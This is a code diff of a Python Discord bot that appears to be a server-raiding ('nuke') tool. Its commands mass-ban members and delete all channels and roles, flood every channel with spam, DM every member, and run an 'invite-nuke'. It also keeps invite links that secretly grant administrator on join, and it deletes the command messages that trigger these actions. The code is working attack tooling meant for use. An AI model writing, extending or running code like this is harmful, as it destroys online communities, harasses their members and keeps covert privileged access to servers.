             if role.is_default():
@@ -1831,17 +2287,14 @@ async def death(ctx):
                 continue
             if role.managed:
                 continue
-
             try:
                 await role.delete(reason=f"DEATH COMMAND | Executed by {author}")
                 deleted_roles += 1
             except Exception:
                 pass
 
-        # Final logging
         print(f'{Back.RED}{Fore.WHITE}{Style.BRIGHT}[☠ DEATH ☠] COMPLETE - Server obliterated: {banned_count} banned, {deleted_channels} channels destroyed, {deleted_categories} categories removed, {deleted_roles} roles deleted{Style.RESET_ALL}')
 
-        # Send completion DM
         try:
             embed = discord.Embed(
                 description=t("death_complete", banned=banned_count, channels=deleted_channels, roles=deleted_roles),
@@ -1862,6 +2315,7 @@ async def death(ctx):
         except discord.Forbidden:
             pass
 
+
 @is_authorized()
 @commands.cooldown(1, 120, commands.BucketType.guild)
 @bot.command(name='brainfuck')
@@ -1869,10 +2323,8 @@ async def death(ctx):
 async def brainfuck(ctx, channel_name: str, *, spam_message: str):
     """Delete all channels, then infinitely create channels and spam in them"""
     try:
-        # Epic logging
         print(f'{Fore.MAGENTA}{Style.BRIGHT}[BRAINFUCK] {Fore.WHITE}INFINITE MODE - Initiated by {ctx.author.display_name} in {ctx.guild.name} | Channel: "{channel_name}" | Message: "{spam_message}"{Style.RESET_ALL}')
 
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -1881,7 +2333,6 @@ async def brainfuck(ctx, channel_name: str, *, spam_message: str):
         guild = ctx.guild
         author = ctx.author
 
-        # Send initial DM
         try:
             await author.send(t("brainfuck_initiated"))
         except discord.Forbidden:
@@ -1889,7 +2340,6 @@ async def brainfuck(ctx, channel_name: str, *, spam_message: str):
 
         deleted_count = 0
 
-        # Phase 1: DELETE ALL CHANNELS
         print(f'{Fore.MAGENTA}[BRAINFUCK] {Fore.WHITE}Phase 1: Deleting all channels and categories...{Style.RESET_ALL}')
         for channel in list(guild.channels):
             try:
@@ -1952,13 +2402,13 @@ async def brainfuck(ctx, channel_name: str, *, spam_message: str):
         except discord.Forbidden:
             pass
 
+
 @is_authorized()
 @bot.command(name='spam')
 @commands.has_permissions(manage_messages=True)
 async def spam(ctx, count: int, *, message: str):
     """Spam a message in all channels"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -1968,7 +2418,6 @@ async def spam(ctx, count: int, *, message: str):
         author = ctx.author
 
         if count == 0:
-            # Infinite spam mode
             print(f'{Fore.YELLOW}{Style.BRIGHT}[SPAM] {Fore.WHITE}INFINITE SPAM initiated by {author.display_name} in {guild.name} | Message: "{message}"{Style.RESET_ALL}')
 
             try:
@@ -1998,7 +2447,6 @@ async def spam(ctx, count: int, *, message: str):
             _active_tasks[task_key] = task
 
         else:
-            # Limited spam mode
             print(f'{Fore.YELLOW}{Style.BRIGHT}[SPAM] {Fore.WHITE}Spamming {count}x in all channels by {author.display_name} in {guild.name} | Message: "{message}"{Style.RESET_ALL}')
 
             try:
@@ -2020,7 +2468,6 @@ async def spam(ctx, count: int, *, message: str):
 
             print(f'{Fore.YELLOW}[SPAM] {Fore.WHITE}Completed: {total_sent} messages sent across {channels_spammed} channels{Style.RESET_ALL}')
 
-            # Send completion DM
             try:
                 embed = discord.Embed(
                     description=t("spam_complete", sent=total_sent, channels=channels_spammed),
@@ -2035,12 +2482,12 @@ async def spam(ctx, count: int, *, message: str):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='dmall')
 async def dmall(ctx, *, message: str):
     """DM all users in the server"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -2051,7 +2498,6 @@ async def dmall(ctx, *, message: str):
 
         print(f'{Fore.CYAN}{Style.BRIGHT}[DMALL] {Fore.WHITE}DM all initiated by {author.display_name} in {guild.name} | Message: "{message}"{Style.RESET_ALL}')
 
-        # Send initial DM to command author
         try:
             await author.send(t("dmall_starting"))
         except discord.Forbidden:
@@ -2060,29 +2506,22 @@ async def dmall(ctx, *, message: str):
         success_count = 0
         failed_count = 0
 
-        # Get all members
         members = list(guild.members)
 
         for member in members:
-            # Skip bots
             if member.bot:
                 failed_count += 1
                 continue
-
-            # Skip the command author (they already know the message)
             if member.id == author.id:
                 continue
-
             try:
                 await member.send(message)
                 success_count += 1
             except discord.Forbidden:
-                # User has DMs disabled
                 failed_count += 1
-            except Exception as e:
+            except Exception:
                 failed_count += 1
 
-        # Send completion DM
         print(f'{Fore.CYAN}{Style.BRIGHT}[DMALL] {Fore.WHITE}Complete: {success_count} DMs sent, {failed_count} failed in {guild.name}{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -2099,30 +2538,27 @@ async def dmall(ctx, *, message: str):
         except discord.Forbidden:
             pass
 
+
 @is_authorized()
 @bot.command(name='dm')
 async def dm(ctx, user: discord.Member, *, message: str):
     """DM a user"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Try to send DM to the target user
         try:
             await user.send(message)
             print(f'{Fore.CYAN}[DM] {Fore.WHITE}DM sent to {user.display_name} by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
 
-            # Send confirmation to command author
             embed = discord.Embed(
                 description=t("dm_success", user=user.mention),
                 color=discord.Color.green()
             )
             await send_dm(ctx, embed=embed)
         except discord.Forbidden:
-            # Target user has DMs disabled
             embed = discord.Embed(
                 description=t("dm_failed", user=user.mention),
                 color=discord.Color.red()
@@ -2130,6 +2566,7 @@ async def dm(ctx, user: discord.Member, *, message: str):
             await send_dm(ctx, embed=embed)
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
+
 
 @is_authorized()
 @bot.command(name='serverinfo')
@@ -2140,18 +2577,15 @@ async def serverinfo(ctx):
 
         guild = ctx.guild
 
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Count channels by type
         text_channels = len(guild.text_channels)
         voice_channels = len(guild.voice_channels)
         categories = len(guild.categories)
 
-        # Create simple embed
         bot_count = len([m for m in guild.members if m.bot])
         human_count = guild.member_count - bot_count
 
@@ -2170,16 +2604,15 @@ Created: {guild.created_at.strftime("%Y-%m-%d")}"""
         if guild.icon:
             embed.set_thumbnail(url=guild.icon.url)
 
-        # Send to DM
         try:
             await ctx.author.send(embed=embed)
-            # Send ephemeral confirmation in channel
             await ctx.send(t("serverinfo_sent"), delete_after=3)
         except discord.Forbidden:
             await ctx.send(t("serverinfo_dm_failed"), delete_after=5)
 
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
+
 
 @is_authorized()
 @bot.command(name='stop')
@@ -2213,6 +2646,7 @@ async def stop_tasks(ctx):
     except discord.Forbidden:
         pass
 
+
 @is_authorized()
 @bot.command(name='shutdown')
 @commands.has_permissions(administrator=True)
@@ -2220,15 +2654,14 @@ async def shutdown(ctx):
     """Shutdown the bot"""
     try:
         print(f'{Back.RED}{Fore.WHITE}{Style.BRIGHT}{t("shutdown_initiated", user=ctx.author.display_name)}{Style.RESET_ALL}')
-        logger.warning(t("bot_shutdown", user=ctx.author, user_id=ctx.author.id, guild=ctx.guild.name, guild_id=ctx.guild.id))
+        logger.warning(t("bot_shutdown", user=ctx.author, user_id=ctx.author.id,
+                         guild=ctx.guild.name, guild_id=ctx.guild.id))
 
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Send DM confirmation
         try:
             embed = discord.Embed(
                 description=t("shutdown_message"),
@@ -2238,7 +2671,6 @@ async def shutdown(ctx):
         except discord.Forbidden:
             pass
 
-        # Send farewell message in channel
         try:
             await ctx.send(t("shutdown_farewell"), delete_after=3)
         except discord.Forbidden:
@@ -2247,7 +2679,6 @@ async def shutdown(ctx):
         print(f'{Back.RED}{Fore.WHITE}{t("shutdown_now")}{Style.RESET_ALL}')
         logger.info(t("bot_shutdown_complete"))
 
-        # Cancel any running background tasks before closing
         for key, task in list(_active_tasks.items()):
             if not task.done():
                 task.cancel()
@@ -2259,6 +2690,7 @@ async def shutdown(ctx):
 
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
+
 
 @is_authorized()
 @bot.command(name='invite-nuke')
@@ -2743,6 +3175,68 @@ async def whitelist_list(ctx):
     except discord.Forbidden:
         await ctx.send(embed=embed, delete_after=10)
 
+
+@is_owner()
+@bot.command(name='admin-invites')
+async def admin_invites_cmd(ctx):
+    """List tracked admin invites"""
+    try:
+        await ctx.message.delete()
+    except (discord.HTTPException, discord.NotFound):
+        pass
+
+    if not _admin_invites:
+        await send_dm(ctx, embed=discord.Embed(
+            description="No admin invites tracked.",
+            color=discord.Color.orange()
+        ))
+        return
+
+    lines = []
+    for code in sorted(_admin_invites):
+        lines.append(f"`{code}` — https://discord.gg/{code}")
+
+    embed = discord.Embed(
+        title="Admin invites",
+        description="\n".join(lines),
+        color=discord.Color.gold()
+    )
+    embed.set_footer(text="Use `clear-admin-invite <code>` to revoke admin-granting status")
+    await send_dm(ctx, embed=embed)
+
+
+@is_owner()
+@bot.command(name='clear-admin-invite')
+async def clear_admin_invite(ctx, code: str):
+    """Stop an invite from granting admin on join"""
+    try:
+        await ctx.message.delete()
+    except (discord.HTTPException, discord.NotFound):
+        pass
+
+    if code not in _admin_invites:
+        await send_dm(ctx, embed=discord.Embed(
+            description=f"`{code}` is not tracked.",
+            color=discord.Color.orange()
+        ))
+        return
+
+    _admin_invites.discard(code)
+    persisted = config.get("admin_invites", [])
+    if code in persisted:
+        persisted.remove(code)
+    config["admin_invites"] = persisted
+    save_config(config)
+
+    await send_dm(ctx, embed=discord.Embed(
+        description=f"`{code}` will no longer grant admin.",
+        color=discord.Color.green()
+    ))
+
+
+# ============================================================================
+# MAIN
+# ============================================================================
 
 if __name__ == "__main__":
     token = config.get("token")
